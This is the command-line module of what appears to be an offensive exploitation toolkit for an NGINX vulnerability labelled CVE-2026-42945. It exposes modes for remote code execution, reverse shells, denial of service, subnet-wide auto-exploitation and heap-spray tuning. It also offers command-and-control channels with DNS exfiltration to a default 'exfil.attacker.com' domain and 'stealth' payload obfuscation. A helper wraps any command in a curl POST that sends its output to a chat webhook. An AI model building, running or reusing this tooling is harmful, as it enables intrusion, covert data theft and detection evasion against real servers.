"""
ui/cli.py — Argument parser and C2 method preparation.
"""
from __future__ import annotations

import argparse

from config import (
    DEFAULT_PORT, DEFAULT_HEAP_BASE, DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
    KNOWN_BUILDS, GSRN_HOST, GSRN_PORT, N_SPRAY, BODY_LEN, _C2_AVAILABLE,
    DATA_ADDR_OFFSET,
)


def parse_int(x: str) -> int:
    return int(x, 0)


def parse_target(s: str) -> "tuple[str, int, str, bool] | None":
    """Parse 'host:port' or 'https://host:port' → (host, port, vhost, use_ssl)."""
    from config import DEFAULT_PORT
    use_ssl = False
    vhost = "localhost"
    if "://" in s:
        from urllib.parse import urlparse
        p = urlparse(s)
        host = p.hostname or s
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = (p.scheme == "https")
        vhost = host
        return host, port, vhost, use_ssl
    if ":" in s:
        h, _, raw_p = s.partition(":")
        try:
            port = int(raw_p)
            vhost = h
            use_ssl = (port == 443)
            return h, port, vhost, use_ssl
        except ValueError:
            return None
    vhost = s
    return s, DEFAULT_PORT, vhost, use_ssl


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="nginx-rift-toolkit",
        description="CVE-2026-42945 (NGINX Rift) Super Toolkit — modular edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --check 192.168.1.100:19321
  python main.py --exploit --host 10.0.0.5 --cmd id
  python main.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444
  python main.py --probe -t 10.0.0.5:19321 --probe-host 10.0.0.1 --probe-port 8006
  python main.py --curl-only https://webhook.site/uuid -t 10.0.0.5:19321
  python main.py --auto-scan 192.168.1.0/24 -o report.html
  python main.py --dos --host 127.0.0.1 --port 19321
  python main.py --listen tcp --listen-port 4444
        """,
    )

    # Target
    p.add_argument("--host", default="127.0.0.1", help="target host")
    p.add_argument("--port", type=int, default=DEFAULT_PORT,
                   help=f"target port (default {DEFAULT_PORT})")
    p.add_argument("-t", "--target", help="target as host:port (overrides --host/--port)")

    # Modes
    p.add_argument("--check", action="store_true",
                   help="detect-only: fingerprint + vuln pattern check")
    p.add_argument("--exploit", action="store_true", help="full RCE exploitation")
    p.add_argument("--shell", action="store_true", help="reverse shell mode")
    p.add_argument("--dos", action="store_true", help="DoS crash verification")

    # Probe mode
    p.add_argument("--probe", action="store_true",
                   help="probe: inject curl/wget beacon to confirm RCE via HTTP callback")
    p.add_argument("--probe-host", default="192.168.140.101", metavar="IP",
                   help="beacon callback IP (default: 192.168.140.101)")
    p.add_argument("--probe-port", type=int, default=8006, metavar="PORT",
                   help="beacon callback port (default: 8006)")
    p.add_argument("--probe-path", default="/ping", metavar="PATH",
                   help="beacon URL path (default: /ping)")

    # Curl-only mode
    p.add_argument("--curl-only", metavar="URL",
                   help="basic RCE: inject curl to the given URL (no listener, for webhooks etc.)")

    # Listen mode
    p.add_argument("--listen", metavar="TYPE",
                   choices=["tcp", "http", "dns", "ws", "all"],
                   help="standalone listener mode (tcp/http/dns/ws/all)")
    p.add_argument("--listen-ip", default="0.0.0.0", metavar="IP",
                   help="bind IP for listener (default: 0.0.0.0)")
    p.add_argument("--listen-port", type=int, default=0, metavar="PORT",
                   help="port for listener (0=auto by type)")
    p.add_argument("--listen-timeout", type=int, default=0, metavar="SECS",
                   help="listener timeout in seconds (0=infinite)")

    # Exploit params
    p.add_argument("--cmd", help="command to execute via system()")
    p.add_argument("--lhost", "--listen-ip-rev", default="172.17.0.1",
                   dest="lhost", help="reverse shell listener IP")
    p.add_argument("--lport", "--listen-port-rev", type=int, default=1337,
                   dest="lport", help="reverse shell port")
    p.add_argument("--l2relay", action="store_true",
                   help="L2 relay mode: rev shell connects to external relay")
    p.add_argument("--l2-relay-ip", metavar="IP",
                   help="L2 relay machine IP")
    p.add_argument("--l2-relay-port", type=int, default=12345, metavar="PORT",
                   help="L2 relay port (default: 12345)")
    p.add_argument("--l1-token", metavar="TOKEN", default="",
                   help="L1 GSocket token (display only)")
    p.add_argument("--l2-secret", metavar="SECRET", default="",
                   help="L2 local secret (display only)")
    p.add_argument(
        "--known-build", metavar="BUILD",
        choices=list(KNOWN_BUILDS.keys()),
        help=(
            "use a known-build preset (sets heap/libc/offsets automatically). "
            f"Choices: {', '.join(k for k in KNOWN_BUILDS if k != '_default')}"
        ),
    )
    p.add_argument("--no-kill-port", action="store_true",
                   help="skip killing existing listener before binding")
    p.add_argument("--heap-base", type=parse_int,
                   help=f"heap base (default: {hex(DEFAULT_HEAP_BASE)})")
    p.add_argument("--libc-base", type=parse_int,
                   help=f"libc base (default: {hex(DEFAULT_LIBC_BASE)})")
    p.add_argument("--system-offset", type=parse_int, default=DEFAULT_SYSTEM_OFFSET,
                   help=f"system() offset (default: {hex(DEFAULT_SYSTEM_OFFSET)})")
    p.add_argument("--offsets", type=str, help="comma-separated heap offsets")
    p.add_argument("--tries", type=int, default=10, help="attempts per candidate")
    p.add_argument("--n-spray", type=int, default=N_SPRAY, help="spray body count")
    p.add_argument("--body-len", type=int, default=BODY_LEN, help="spray body length")
    p.add_argument("--no-safe-check", action="store_true",
                   help="skip URI-safe byte filtering")

    # 32-bit brute-force
    p.add_argument("--bruteforce-32", nargs=2, metavar=("TARGET", "CALLBACK_IP"),
                   help="32-bit remote brute-force RCE")

    # Subnet scan
    p.add_argument("--scan-subnet", metavar="CIDR",
                   help="scan CIDR subnet for live hosts")
    p.add_argument("--scan-ssh", action="store_true",
                   help="scan with SSH version detection")
    p.add_argument("--user", default="root", help="SSH user")
    p.add_argument("--password", help="SSH password")
    p.add_argument("--key", "--key-path", dest="key_path", help="SSH private key path")
    p.add_argument("--workers", type=int, default=20, help="scan worker threads")

    # Auto modes
    p.add_argument("--auto-scan", metavar="CIDR",
                   help="auto-scan: discover + fingerprint + report")
    p.add_argument("--auto-patch", metavar="CIDR",
                   help="auto-patch: scan + patch + verify")
    p.add_argument("--auto-exploit", metavar="TARGET",
                   help="auto-exploit: fingerprint + exploit + report")

    # Patch
    p.add_argument("--patch", metavar="HOST",
                   help="SSH remote patching of a single host")
    p.add_argument("--dry-run", action="store_true", help="patch dry-run simulation")

    # Output capture
    p.add_argument("--gsocket", action="store_true",
                   help="capture RCE output via GSocket/GSRN relay")
    p.add_argument("--gs-secret", metavar="SECRET",
                   help="GSocket shared secret (auto-generated if omitted)")
    p.add_argument("--gs-relay", metavar="HOST:PORT",
                   default=f"{GSRN_HOST}:{GSRN_PORT}",
                   help=f"GSRN relay address (default: {GSRN_HOST}:{GSRN_PORT})")
    p.add_argument("--callback-ip", metavar="IP",
                   help="HTTP callback IP (requires public IP reachable from target)")
    p.add_argument("--spray-path", metavar="PATH",
                   help="path for spray POST requests (auto-discovered if omitted)")
    p.add_argument("--data-offset", type=parse_int, default=DATA_ADDR_OFFSET,
                   help=f"heap offset from spray pointer to cmd string (default: {DATA_ADDR_OFFSET})")
    p.add_argument("--callback-port", type=int, default=9876,
                   help="HTTP callback port (default: 9876)")

    # Bulk check
    p.add_argument("--bulk-check", metavar="FILE",
                   help="bulk fingerprint+vuln check from a target list file")

    # Web audit
    p.add_argument("--audit", metavar="TARGET",
                   help="full web audit (headers, paths, TLS, WAF)")
    p.add_argument("--audit-headers", action="store_true",
                   help="check security headers only")
    p.add_argument("--audit-paths", action="store_true",
                   help="discover interesting paths")

    # Output
    p.add_argument("-o", "--output", help="output file (HTML or JSON)")
    p.add_argument("-j", "--json", action="store_true", help="JSON output mode")
    p.add_argument("--verbose", "-v", action="store_true", help="verbose output")

    # C2 options (if available)
    if _C2_AVAILABLE:
        p.add_argument("--c2", metavar="METHOD",
                       choices=["tcp", "http", "dns", "icmp", "ws", "slack",
                                "discord", "telegram", "gsocket", "l2relay", "auto"],
                       help="C2 method for RCE")
        p.add_argument("--c2-url", metavar="URL", help="C2 callback URL")
        p.add_argument("--c2-webhook", metavar="URL",
                       help="Webhook URL (Slack/Discord/Telegram)")
        p.add_argument("--c2-dns-server", metavar="IP",
                       help="DNS server for DNS exfiltration")
        p.add_argument("--c2-domain", metavar="DOMAIN", default="exfil.attacker.com",
                       help="Domain for DNS exfil")
        p.add_argument("--c2-timeout", type=int, default=120,
                       help="C2 listener timeout (default: 120s)")
        p.add_argument("--c2-fallback", action="store_true",
                       help="Enable auto-fallback between C2 methods")
        p.add_argument("--obfuscate", metavar="LEVEL",
                       choices=["light", "medium", "heavy", "stealth"],
                       help="Payload obfuscation level")
        p.add_argument("--verify", action="store_true",
                       help="Enable command execution verification")
        p.add_argument("--verify-method", metavar="METHOD",
                       choices=["markers", "checksum", "size"],
                       default="markers", help="Verification method")

    return p


def _prepare_c2_method(args) -> tuple | None:
    """
    Inspect parsed args and return (c2_method_name, payload_processor) or None.
    payload_processor is a callable(cmd: str) -> str, or None.
    """
    if not _C2_AVAILABLE or not hasattr(args, "c2") or not args.c2:
        return None

    c2 = args.c2
    if c2 == "auto":
        return ("fallback", None)

    try:
        from c2_methods import DNSExfiltration  # type: ignore[import]
        from c2_obfuscator import ObfuscationProfile  # type: ignore[import]

        if c2 == "dns":
            dns_server = getattr(args, "c2_dns_server", "8.8.8.8") or "8.8.8.8"
            domain = getattr(args, "c2_domain", "exfil.attacker.com")
            obf_level = getattr(args, "obfuscate", None)

            def processor(cmd: str) -> str:
                method = DNSExfiltration(dns_server=dns_server, domain=domain)
                payload = method.generate_payload(cmd, dns_server=dns_server, domain=domain)
                if obf_level and obf_level != "none":
                    fn = getattr(ObfuscationProfile, f"{obf_level}_obfuscation", None)
                    if fn:
                        payload = fn(payload)
                return payload

            return (c2, processor)

        if c2 in ("slack", "discord", "telegram"):
            webhook_url = getattr(args, "c2_webhook", "") or ""

            def processor(cmd: str) -> str:
                return f"curl -X POST '{webhook_url}' -d '{{\"text\":\"$({cmd})\"}}'  "

            return (c2, processor)

    except ImportError:
        pass

    return (c2, None)
